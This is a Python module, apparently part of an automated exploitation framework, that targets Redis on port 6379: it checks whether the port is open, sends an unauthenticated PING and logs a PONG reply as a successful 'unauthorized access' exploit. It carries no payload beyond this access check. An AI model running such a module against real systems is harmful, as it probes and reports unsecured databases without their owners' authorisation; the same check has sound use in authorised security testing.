"""
Redis Exploit Module
Exploits Redis NoSQL database vulnerabilities
"""

import socket
from typing import Dict, Tuple

import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Redis_Exploit(BaseExploit):
    """
    Redis Unauthorized Access Exploit
    Targets: Redis databases (port 6379)
    """
    
    def __init__(self):
        super().__init__(
            name="Redis_Unauthorized",
            target_ports=[6379],
            target_os=["Windows", "Linux", "Unix"]
        )
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if Redis is accessible"""
        ip = target['ip']
        
        if 6379 not in target.get('open_ports', []):
            return False
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((ip, 6379))
            sock.close()
            
            if result == 0:
                logger.debug(f"Redis port accessible on {ip}")
                return True
        except Exception as e:
            logger.debug(f"Redis check failed on {ip}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Redis exploitation"""
        ip = target['ip']
        logger.info(f"Attempting Redis exploit on {ip}")
        
        try:
            try:
                import redis
                has_redis = True
            except ImportError:
                has_redis = False
                logger.warning("redis-py not installed, using simulation")
            
            # Try unauthenticated access
            if has_redis:
                success = self._try_redis_access_real(ip)
            else:
                success = self._try_redis_access_sim(ip)
            
            if success:
                self.stats['success'] += 1
                logger.success(f"Redis unauthorized access on {ip}")
                
                return True, {
                    'method': 'Redis_Unauthorized',
                    'credentials': 'none (unauthenticated)',
                    'port': 6379,
                    'service': 'Redis'
                }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Redis exploit error on {ip}: {e}")
            return False, {}
    
    def _try_redis_access_real(self, ip: str) -> bool:
        """Try real Redis access"""
        try:
            import redis
            
            r = redis.Redis(host=ip, port=6379, socket_timeout=5)
            r.ping()
            return True
        except:
            return False
    
    def _try_redis_access_sim(self, ip: str) -> bool:
        """Simulate Redis access"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, 6379))
            
            if result == 0:
                # Send PING command
                sock.send(b"PING\r\n")
                response = sock.recv(1024)
                sock.close()
                
                # Check for PONG response
                if b"PONG" in response or b"+PONG" in response:
                    return True
            
            sock.close()
            return False
            
        except:
            return False
